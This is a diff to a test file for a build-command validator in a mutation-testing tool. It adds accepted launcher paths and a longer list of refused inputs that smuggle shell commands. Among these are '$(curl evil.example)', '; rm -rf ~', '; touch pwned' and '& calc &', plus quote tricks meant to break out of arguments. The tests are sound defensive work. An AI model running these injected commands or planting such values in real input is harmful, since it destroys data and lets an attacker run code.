@@ -255,13 +255,33 @@ describe('a build tool\'s commands', () => {
     './build/gradlew :mutasticVerify', '/home/you/repo/gradlew :mutasticVerify', 'sh /home/you/repo/gradlew :mutasticVerify',
     '/home/you/repo/mvnw mutastic:verify', '/opt/gradle-8.2.1/bin/gradle :mutasticVerify', '/usr/local/bin/mvn mutastic:verify',
     '.\\gradlew.bat :mutasticVerify', '..\\mvnw.cmd mutastic:verify', 'C:\\Users\\RUNNER~1\\repo\\gradlew.bat :mutasticVerify',
-    'D:\\repo\\mvnw.cmd mutastic:verify'];
+    'D:\\repo\\mvnw.cmd mutastic:verify',
+    // A path with a space, quoted as the Java edition writes it; a Windows directory after it.
+    "'/Users/me/My Projects/gradlew' :mutasticVerify", "sh '/Users/me/My Projects/gradlew' :mutasticVerify",
+    "'./My Projects/app/gradlew' :mutasticVerify", "sh '../My Projects/mvnw' mutastic:verify", "'/opt/my tools/bin/mvn' mutastic:verify",
+    '"C:\\My Projects\\gradlew.bat" :mutasticVerify', '"D:\\a b\\RUNNER~1\\mvnw.cmd" mutastic:verify',
+    '.\\gradlew.bat :mutasticVerify -p C:\\dir\\app', '"C:\\My Projects\\gradlew.bat" :mutasticVerify -p "C:\\My Projects\\app"',
+    "./gradlew :mutasticVerify -p 'C:\\my app'", './gradlew :mutasticVerify -p x\\y', "./gradlew :mutasticVerify -p 'it'\\''s'"];
   const refused = ['sh evil :mutasticVerify', 'sh -c ./gradlew :mutasticVerify', 'bash ./gradlew :mutasticVerify', 'sh gradle :mutasticVerify',
     './evil :mutasticVerify', './gradlew.sh :mutasticVerify', 'gradle/../evil :mutasticVerify', '../gradle :mutasticVerify',
     '/tmp/$(curl evil.example)/gradlew :mutasticVerify', '/tmp/`id`/gradlew :mutasticVerify', "'/my repo'/gradlew :mutasticVerify",
     '/my repo/gradlew :mutasticVerify', '%TEMP%\\gradlew.bat :mutasticVerify', '$HOME/gradlew :mutasticVerify', '~/gradlew :mutasticVerify',
     'C:\\evil.exe :mutasticVerify', 'sh .\\gradlew.bat :mutasticVerify', '/repo/gradlew; rm -rf ~ :mutasticVerify',
-    './gradlew :mutasticVerify -p x\\y', 'mvnx mutastic:verify', ' ./gradlew :mutasticVerify'];
+    'mvnx mutastic:verify', ' ./gradlew :mutasticVerify',
+    // Quoted, but with something in it a shell or cmd expands, or a quote left open.
+    "'/my $HOME/gradlew' :mutasticVerify", "'/my %TEMP%/gradlew' :mutasticVerify", "'/my `id`/gradlew' :mutasticVerify",
+    "'/a'b'/gradlew' :mutasticVerify", "'/my repo/gradlew :mutasticVerify", "'/my repo'/gradlew :mutasticVerify",
+    "'/my;repo/gradlew' :mutasticVerify", "'/my&repo/gradlew' :mutasticVerify", "'/my repo/evil' :mutasticVerify",
+    '"/my repo/gradlew" :mutasticVerify', '"C:\\my %TEMP%\\gradlew.bat" :mutasticVerify', '"C:\\a&b\\gradlew.bat" :mutasticVerify',
+    '"C:\\my repo\\gradlew.bat :mutasticVerify', "'C:\\my repo\\gradlew.bat' :mutasticVerify", 'sh "C:\\my repo\\gradlew.bat" :mutasticVerify',
+    // After the launcher: a backslash that could hide a quote or start something, or a quote left open.
+    "./gradlew :mutasticVerify -p x\\' ; touch pwned ; echo '", '"C:\\a b\\gradlew.bat" :mutasticVerify -p "C:\\x\\" & calc & "',
+    './gradlew :mutasticVerify -p x\\$HOME', './gradlew :mutasticVerify -p x\\', './gradlew :mutasticVerify -p \\\\server\\share',
+    "./gradlew :mutasticVerify -p 'x", './gradlew :mutasticVerify -p "x', './gradlew :mutasticVerify -p %TEMP%',
+    './gradlew :mutasticVerify -p "$HOME"', './gradlew :mutasticVerify -p "x%TEMP%"', "./gradlew :mutasticVerify -p 'a&calc'",
+    './gradlew :mutasticVerify -p *', './gradlew :mutasticVerify -p x^&calc', './gradlew :mutasticVerify -p <x$(id)>',
+    // A single quote inside double ones isn't the start of a quoted span that could hide `;`.
+    `./gradlew :mutasticVerify -Dmutastic.reason="can't" ; touch pwned ; echo 'x'`];
   const with_ = (launcher) => {
     const json = JSON.parse(JAVA);
     json.mutastic.commands = { verify: `${launcher} -Dmutastic.mutant=<id>` };
